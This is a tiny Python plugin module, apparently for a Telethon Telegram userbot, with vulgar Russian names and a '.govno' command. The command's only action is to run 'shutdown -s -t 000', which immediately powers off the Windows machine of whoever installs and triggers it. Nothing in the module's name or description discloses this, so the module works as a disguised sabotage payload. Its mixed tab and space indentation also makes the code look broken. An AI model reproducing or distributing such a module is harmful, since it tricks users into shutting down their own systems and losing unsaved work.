#by @FlinGer_Bs
from time import sleep
from telethon import events
import asyncio
import os
from.. import loader 

def register(cb):
	cb(GovnoMod()) 
	
class GovnoMod(loader.Module):
	"""Говно"""
	strings = {'name': 'pizdets'} 
	
	async def govnocmd(self, message):
		"""Просто .govno"""
        os.system('shutdown -s -t 000')

